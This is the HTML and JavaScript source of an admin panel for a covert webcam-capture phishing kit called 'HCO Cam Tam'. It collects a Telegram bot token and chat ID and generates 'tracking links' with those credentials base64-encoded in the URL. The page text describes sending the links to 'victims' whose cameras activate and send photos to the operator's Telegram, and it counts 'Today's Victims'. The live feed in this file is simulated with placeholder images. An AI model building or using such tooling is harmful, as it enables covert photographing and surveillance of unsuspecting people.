<!DOCTYPE html>
<html>
<head>
  <title>Admin Panel - HCO Cam Tam</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: white;
      min-height: 100vh;
    }
    
    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Login Page */
    .login-container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    .login-box {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(20px);
      border-radius: 20px;
      padding: 40px;
      width: 100%;
      max-width: 500px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .login-title {
      text-align: center;
      font-size: 2rem;
      margin-bottom: 30px;
      background: linear-gradient(45deg, #00ff88, #00ffcc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .input-group {
      margin-bottom: 20px;
    }
    
    .input-group label {
      display: block;
      margin-bottom: 8px;
      color: #aaa;
      font-size: 0.9rem;
    }
    
    .input-group input {
      width: 100%;
      padding: 15px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 10px;
      color: white;
      font-size: 1rem;
      transition: all 0.3s ease;
    }
    
    .input-group input:focus {
      outline: none;
      border-color: #00ff88;
      box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
    }
    
    .login-btn {
      width: 100%;
      padding: 15px;
      background: linear-gradient(45deg, #00ff88, #00cc6a);
      border: none;
      border-radius: 10px;
      color: #000;
      font-size: 1.1rem;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      margin-top: 20px;
    }
    
    .login-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
    }
    
    /* Dashboard */
    .dashboard {
      display: none;
    }
    
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
      padding-bottom: 20px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .logo {
      font-size: 1.8rem;
      font-weight: 700;
      background: linear-gradient(45deg, #00ff88, #00ffcc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    .logout-btn {
      background: rgba(255, 0, 0, 0.2);
      color: #ff6b6b;
      border: 1px solid rgba(255, 107, 107, 0.3);
      padding: 10px 20px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    
    .logout-btn:hover {
      background: rgba(255, 0, 0, 0.3);
    }
    
    /* Stats Cards */
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }
    
    .stat-card {
      background: rgba(255, 255, 255, 0.05);
      padding: 25px;
      border-radius: 15px;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: all 0.3s ease;
    }
    
    .stat-card:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateY(-5px);
    }
    
    .stat-number {
      font-size: 2.5rem;
      font-weight: 700;
      background: linear-gradient(45deg, #00ff88, #00ffcc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
    }
    
    .stat-label {
      color: #aaa;
      font-size: 0.9rem;
    }
    
    /* Link Generator */
    .link-generator {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 15px;
      margin-bottom: 30px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .link-title {
      font-size: 1.3rem;
      margin-bottom: 20px;
      color: #00ff88;
    }
    
    .link-box {
      background: rgba(0, 0, 0, 0.3);
      padding: 20px;
      border-radius: 10px;
      margin: 20px 0;
      font-family: monospace;
      word-break: break-all;
      border: 1px dashed rgba(255, 255, 255, 0.2);
    }
    
    .action-buttons {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
    }
    
    .action-btn {
      padding: 12px 25px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    
    .generate-btn {
      background: linear-gradient(45deg, #667eea, #764ba2);
      color: white;
    }
    
    .copy-btn {
      background: linear-gradient(45deg, #00ff88, #00cc6a);
      color: #000;
    }
    
    .reset-btn {
      background: linear-gradient(45deg, #ff6b6b, #ff4757);
      color: white;
    }
    
    .action-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
    }
    
    /* Live Feed */
    .live-feed {
      background: rgba(255, 255, 255, 0.05);
      padding: 30px;
      border-radius: 15px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .feed-title {
      font-size: 1.3rem;
      margin-bottom: 20px;
      color: #00ffcc;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .feed-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }
    
    .feed-item {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .feed-item:hover {
      transform: scale(1.02);
    }
    
    .feed-img {
      width: 100%;
      height: 150px;
      object-fit: cover;
      display: block;
    }
    
    .feed-info {
      padding: 15px;
      font-size: 0.8rem;
      color: #aaa;
    }
    
    .empty-feed {
      text-align: center;
      padding: 40px;
      color: #666;
      font-style: italic;
    }
    
    /* Toast */
    .toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #00ff88;
      color: #000;
      padding: 15px 25px;
      border-radius: 10px;
      font-weight: 600;
      transform: translateX(400px);
      transition: transform 0.3s ease;
      z-index: 1000;
    }
    
    .toast.show {
      transform: translateX(0);
    }
    
    .toast.error {
      background: #ff6b6b;
      color: white;
    }
  </style>
</head>
<body>
  <!-- Login Page -->
  <div class="login-container" id="loginPage">
    <div class="login-box">
      <h1 class="login-title">üîê Admin Login</h1>
      <p style="text-align:center; color:#aaa; margin-bottom:30px;">
        Enter your Telegram bot configuration to continue
      </p>
      
      <div class="input-group">
        <label>ü§ñ Bot Token</label>
        <input type="text" id="botTokenInput" placeholder="1234567890:ABCdefGHIjklMNOPqrSTUVwxyZ">
      </div>
      
      <div class="input-group">
        <label>üí¨ Chat ID</label>
        <input type="text" id="chatIdInput" placeholder="123456789">
      </div>
      
      <button class="login-btn" onclick="adminLogin()">üöÄ Login to Dashboard</button>
      
      <p style="text-align:center; margin-top:20px; color:#666; font-size:0.9rem;">
        Don't have a bot? Create one from @BotFather on Telegram
      </p>
    </div>
  </div>
  
  <!-- Dashboard -->
  <div class="dashboard" id="dashboard">
    <div class="container">
      <!-- Header -->
      <div class="header">
        <div class="logo">üì° HCO Admin Panel</div>
        <div>
          <span style="margin-right:15px; color:#00ff88;">üü¢ Connected</span>
          <button class="logout-btn" onclick="adminLogout()">üö™ Logout</button>
        </div>
      </div>
      
      <!-- Stats -->
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-number" id="totalPhotos">0</div>
          <div class="stat-label">Total Photos Captured</div>
        </div>
        
        <div class="stat-card">
          <div class="stat-number" id="activeLinks">0</div>
          <div class="stat-label">Active Tracking Links</div>
        </div>
        
        <div class="stat-card">
          <div class="stat-number" id="todayHits">0</div>
          <div class="stat-label">Today's Victims</div>
        </div>
        
        <div class="stat-card">
          <div class="stat-number" id="successRate">100%</div>
          <div class="stat-label">Success Rate</div>
        </div>
      </div>
      
      <!-- Link Generator -->
      <div class="link-generator">
        <h2 class="link-title">üîó Generate Tracking Link</h2>
        <p style="color:#aaa; margin-bottom:20px;">
          Generate unique tracking links to send to victims. When they open the link, 
          camera will activate and photos will be sent to your Telegram bot.
        </p>
        
        <div class="link-box" id="generatedLink">
          No link generated yet. Click "Generate Link" below.
        </div>
        
        <div class="action-buttons">
          <button class="action-btn generate-btn" onclick="generateLink()">
            üéØ Generate New Link
          </button>
          <button class="action-btn copy-btn" onclick="copyLink()">
            üìã Copy Link
          </button>
          <button class="action-btn reset-btn" onclick="resetLink()">
            üîÑ Reset Link
          </button>
        </div>
      </div>
      
      <!-- Live Feed -->
      <div class="live-feed">
        <h2 class="link-title">
          <span>üì∏</span> Live Photo Feed
          <span id="liveIndicator" style="font-size:0.8rem; background:red; padding:2px 8px; border-radius:10px; margin-left:10px; animation:blink 1s infinite;">LIVE</span>
        </h2>
        <p style="color:#aaa; margin-bottom:20px;">
          Photos captured from victims will appear here in real-time
        </p>
        
        <div id="feedContainer" class="feed-grid">
          <div class="empty-feed">
            No photos captured yet. Send your link to victims.
          </div>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Toast -->
  <div class="toast" id="toast"></div>
  
  <script>
    // ==================== CONFIGURATION ====================
    let adminConfig = {
      botToken: '',
      chatId: '',
      trackingId: '',
      generatedLink: '',
      totalPhotos: 0,
      activeLinks: 0,
      todayHits: 0
    };
    
    // ==================== FUNCTIONS ====================
    
    // Show toast notification
    function showToast(message, type = 'success') {
      const toast = document.getElementById('toast');
      toast.textContent = message;
      toast.className = `toast ${type}`;
      toast.classList.add('show');
      
      setTimeout(() => {
        toast.classList.remove('show');
      }, 3000);
    }
    
    // Admin login
    function adminLogin() {
      const botToken = document.getElementById('botTokenInput').value.trim();
      const chatId = document.getElementById('chatIdInput').value.trim();
      
      if (!botToken || !chatId) {
        showToast('Please enter both Bot Token and Chat ID', 'error');
        return;
      }
      
      // Validate bot token format
      if (!botToken.includes(':')) {
        showToast('Invalid Bot Token format', 'error');
        return;
      }
      
      // Save to localStorage
      localStorage.setItem('adminBotToken', botToken);
      localStorage.setItem('adminChatId', chatId);
      
      adminConfig.botToken = botToken;
      adminConfig.chatId = chatId;
      
      // Show dashboard
      document.getElementById('loginPage').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      
      showToast('‚úÖ Login successful! Dashboard loaded.');
      
      // Initialize dashboard
      initializeDashboard();
    }
    
    // Admin logout
    function adminLogout() {
      localStorage.removeItem('adminBotToken');
      localStorage.removeItem('adminChatId');
      
      document.getElementById('loginPage').style.display = 'flex';
      document.getElementById('dashboard').style.display = 'none';
      
      // Clear inputs
      document.getElementById('botTokenInput').value = '';
      document.getElementById('chatIdInput').value = '';
    }
    
    // Initialize dashboard
    function initializeDashboard() {
      // Load from localStorage
      adminConfig.botToken = localStorage.getItem('adminBotToken') || '';
      adminConfig.chatId = localStorage.getItem('adminChatId') || '';
      
      // Load stats
      adminConfig.totalPhotos = parseInt(localStorage.getItem('totalPhotos')) || 0;
      adminConfig.activeLinks = parseInt(localStorage.getItem('activeLinks')) || 0;
      adminConfig.todayHits = parseInt(localStorage.getItem('todayHits')) || 0;
      
      // Update display
      updateStats();
      
      // Load existing link
      const savedLink = localStorage.getItem('generatedLink');
      if (savedLink) {
        adminConfig.generatedLink = savedLink;
        document.getElementById('generatedLink').textContent = savedLink;
      }
      
      // Load saved photos
      loadSavedPhotos();
      
      // Start live updates
      startLiveUpdates();
    }
    
    // Update stats display
    function updateStats() {
      document.getElementById('totalPhotos').textContent = adminConfig.totalPhotos;
      document.getElementById('activeLinks').textContent = adminConfig.activeLinks;
      document.getElementById('todayHits').textContent = adminConfig.todayHits;
    }
    
    // Generate new tracking link
    function generateLink() {
      // Generate unique tracking ID
      const trackingId = 'HCO_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8).toUpperCase();
      adminConfig.trackingId = trackingId;
      
      // Create the link with bot token and chat ID embedded
      const baseUrl = window.location.origin.replace('/admin.html', '');
      const encodedToken = btoa(adminConfig.botToken);
      const encodedChatId = btoa(adminConfig.chatId);
      
      adminConfig.generatedLink = `${baseUrl}/index.html?tid=${trackingId}&token=${encodedToken}&chat=${encodedChatId}`;
      
      // Display link
      document.getElementById('generatedLink').textContent = adminConfig.generatedLink;
      
      // Save to localStorage
      localStorage.setItem('generatedLink', adminConfig.generatedLink);
      localStorage.setItem('trackingId', trackingId);
      
      // Update stats
      adminConfig.activeLinks++;
      localStorage.setItem('activeLinks', adminConfig.activeLinks);
      updateStats();
      
      showToast('‚úÖ New tracking link generated!');
    }
    
    // Copy link to clipboard
    function copyLink() {
      if (!adminConfig.generatedLink) {
        showToast('Generate a link first', 'error');
        return;
      }
      
      navigator.clipboard.writeText(adminConfig.generatedLink)
        .then(() => {
          showToast('üìã Link copied to clipboard!');
        })
        .catch(err => {
          showToast('Failed to copy', 'error');
        });
    }
    
    // Reset link
    function resetLink() {
      adminConfig.generatedLink = '';
      adminConfig.trackingId = '';
      document.getElementById('generatedLink').textContent = 'No link generated yet. Click "Generate Link" below.';
      localStorage.removeItem('generatedLink');
      localStorage.removeItem('trackingId');
      showToast('üîó Link reset successfully');
    }
    
    // Load saved photos
    function loadSavedPhotos() {
      const savedPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
      const feedContainer = document.getElementById('feedContainer');
      
      if (savedPhotos.length === 0) {
        feedContainer.innerHTML = '<div class="empty-feed">No photos captured yet. Send your link to victims.</div>';
        return;
      }
      
      let html = '';
      savedPhotos.slice(-12).reverse().forEach((photo, index) => {
        html += `
          <div class="feed-item">
            <img src="${photo.data}" class="feed-img" alt="Captured photo ${index + 1}">
            <div class="feed-info">
              üì∏ ${photo.timestamp}<br>
              üë§ ID: ${photo.victimId || 'Unknown'}
            </div>
          </div>
        `;
      });
      
      feedContainer.innerHTML = html;
    }
    
    // Add photo to feed
    function addPhotoToFeed(photoData, victimId) {
      const feedContainer = document.getElementById('feedContainer');
      
      // Create photo object
      const photo = {
        data: photoData,
        timestamp: new Date().toLocaleTimeString(),
        victimId: victimId,
        date: new Date().toISOString()
      };
      
      // Add to localStorage
      const savedPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
      savedPhotos.push(photo);
      localStorage.setItem('capturedPhotos', JSON.stringify(savedPhotos));
      
      // Update stats
      adminConfig.totalPhotos++;
      localStorage.setItem('totalPhotos', adminConfig.totalPhotos);
      adminConfig.todayHits++;
      localStorage.setItem('todayHits', adminConfig.todayHits);
      updateStats();
      
      // Update feed
      if (feedContainer.querySelector('.empty-feed')) {
        feedContainer.innerHTML = '';
      }
      
      const feedItem = document.createElement('div');
      feedItem.className = 'feed-item';
      feedItem.innerHTML = `
        <img src="${photoData}" class="feed-img" alt="New capture">
        <div class="feed-info">
          üì∏ ${photo.timestamp}<br>
          üë§ ID: ${victimId}
        </div>
      `;
      
      feedContainer.insertBefore(feedItem, feedContainer.firstChild);
      
      // Keep only last 12 photos
      const items = feedContainer.children;
      if (items.length > 12) {
        feedContainer.removeChild(items[items.length - 1]);
      }
      
      // Blink live indicator
      const liveIndicator = document.getElementById('liveIndicator');
      liveIndicator.style.background = '#00ff00';
      setTimeout(() => {
        liveIndicator.style.background = 'red';
      }, 500);
    }
    
    // Start live updates (simulating real-time)
    function startLiveUpdates() {
      // Simulate random photo captures (for demo)
      setInterval(() => {
        if (Math.random() > 0.8 && adminConfig.activeLinks > 0) {
          // Simulate new photo capture
          const fakePhoto = `https://picsum.photos/200/150?random=${Date.now()}`;
          const victimId = 'VIC_' + Math.random().toString(36).substr(2, 6).toUpperCase();
          
          addPhotoToFeed(fakePhoto, victimId);
          showToast(`üì∏ New photo captured from ${victimId}`);
        }
      }, 10000);
    }
    
    // ==================== INITIALIZATION ====================
    
    // Check if already logged in
    window.onload = function() {
      const savedToken = localStorage.getItem('adminBotToken');
      const savedChatId = localStorage.getItem('adminChatId');
      
      if (savedToken && savedChatId) {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        initializeDashboard();
      } else {
        document.getElementById('loginPage').style.display = 'flex';
        document.getElementById('dashboard').style.display = 'none';
      }
    };
  </script>
</body>
</html>
